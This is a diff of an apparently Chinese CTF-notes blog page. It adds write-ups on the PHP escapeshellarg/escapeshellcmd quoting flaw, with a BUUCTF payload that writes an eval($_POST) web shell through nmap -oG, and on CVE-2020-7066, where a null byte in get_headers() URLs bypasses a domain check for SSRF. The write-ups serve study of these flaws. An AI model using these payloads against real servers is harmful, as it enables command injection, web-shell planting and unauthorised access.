@@ -196,7 +196,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.8k 字
+      2.6k 字
     </span>
   
 
@@ -206,7 +206,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      24
+      34
        分钟
     </span>
   
@@ -248,7 +248,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021年3月10日 晚上
+                  本文最后更新于：2021年3月11日 下午
                 
               </p>
             
@@ -352,6 +352,39 @@
 
 
 <h2 id="php伪协议的运用"><a href="#php伪协议的运用" class="headerlink" title="php伪协议的运用"></a>php伪协议的运用</h2><p><a href="http://na0hblog.top/">http://na0hblog.top/</a></p>
+<h2 id="escapeshellarg-escapeshellcmd造成的漏洞"><a href="#escapeshellarg-escapeshellcmd造成的漏洞" class="headerlink" title="escapeshellarg+escapeshellcmd造成的漏洞"></a>escapeshellarg+escapeshellcmd造成的漏洞</h2><ul>
+<li><p>Escapeshellarg：把字符串转码为可以在 shell 命令里使用的参数<br>Escapeshellcmd：对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义</p>
+</li>
+<li><p>(该漏洞实际就是两次转义后的闭合出现了问题，没考虑到单引号<br>不过现在无论哪个版本好像都被修复了。。)</p>
+</li>
+</ul>
+<blockquote>
+<p>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code><br><strong>escapeshellarg</strong>处理后：<br><code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对<code>单引号&#39;</code>转义，再用单引号将左右两部分括起来从而起到连接的作用<br><strong>escapeshellcmd</strong>处理后：<br><code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这里escapeshellcmd对<code>\</code>以及<code>最后那个不配对儿的引号</code>进行了转义</p>
+<p>最终 <code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>就相当于<code>172.17.0.2\ -v -d a=1&#39;</code><br>中间的<code>\\</code>被解释为<code>\</code>而不是转义字符，故<code>\后面的&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。<br>则curl 172.17.0.2\ -v -d a=1’，即为向172.17.0.2\发起请求，POST 数据为a=1’</p>
+</blockquote>
+<p>在给出做题时的例子：</p>
+<blockquote>
+<p>[BUUCTF 2018]Online Tool：</p>
+<p>(ps：nmap -oG 可将命令写入文件；命令含闭合引号无影响)</p>
+<p>首先要明确会被\转义的符号：<code>\、?、&lt;、&gt;、(、)、[、]、;、不配对的&#39;、&#39;&#39;</code><br>1、<code>传入&#39; &lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG hhh.php</code><br>=&gt; <code>&#39;&#39;\&#39;&#39; &lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG hhh.php&#39;</code><br>=&gt; <code> &#39;&#39;\&#39;&#39; \&lt;\?php eval\($_POST\[&quot;a&quot;\]\)\;\?\&gt; -oG hhh.php \&#39;</code><br>此时文件名为<code>hhh.php&#39;</code></p>
+<p>2、传入<code>&#39; &lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG hhh.php &#39;</code><br>=&gt;<code>  &#39;&#39;\&#39;&#39; &lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG hhh.php &#39;\&#39;&#39;&#39;</code><br>=&gt; <code>&#39;&#39;\\&#39;&#39; \&lt;\?php eval\($_POST\[&quot;a&quot;\]\)\;\?\&gt; -oG hhh.php &#39;\\&#39;&#39;&#39;    </code><br>（这里的’和文件名中间必须有空格，否则就会生成hhh.php\这样的文件）</p>
+<p>故最终payload：<code>&#39; &lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG hhh.php &#39;</code></p>
+</blockquote>
+<h1 id="cve-2020-7066"><a href="#cve-2020-7066" class="headerlink" title="cve-2020-7066"></a>cve-2020-7066</h1><ul>
+<li><p>描述：在PHP版本7.2.x低于7.2.29；7.3.x低于7.3.16；7.4.x低于7.4.4，而使用get_headers（）与用户提供的网址，如果URL包含零（\0）字符，URL将被默默地截断在它。这可能会导致某些软件对get_headers的目标做出错误的假设，并可能向错误的服务器发送一些信息</p>
+</li>
+<li><p>get_headers() 返回一个数组，包含有服务器响应一个 HTTP 请求所发送的标头</p>
+</li>
+<li><p>在该漏洞中get_headers() 会静默地截断它使用的URL中空字节之后的任何内容。这个在网页里可以结合SSRF使用，可以用来绕过对url尾部的检测，并且访问我们想要访问的地址，得到一些敏感的标头信息，造成信息泄露。</p>
+<blockquote>
+<p>eg：[GKCTF2020]cve版签到</p>
+<p>只允许访问后缀为.ctfhub.com的网页；</p>
+<p><img src="https://i.loli.net/2021/03/11/vUwPecRdzS1B29M.png" srcset="/img/loading.gif"><br>这时就可以构造url%00.ctfhub.com绕过检测，从而访问url</p>
+<p><img src="https://i.loli.net/2021/03/11/M6XZCi7JDdArjnI.png" srcset="/img/loading.gif" alt="127.0.0.1%00.cth.com"></p>
+<p>再根据提示访问<code>127.0.0.123%00.ctfhub.com</code>即可获取flag</p>
+</blockquote>
+</li>
+</ul>
 <h1 id="未完待续。。。"><a href="#未完待续。。。" class="headerlink" title="未完待续。。。"></a>未完待续。。。</h1><p><img src="https://i.loli.net/2021/03/10/857Yrt69bD2keOP.png" srcset="/img/loading.gif"></p>
 
             </div>
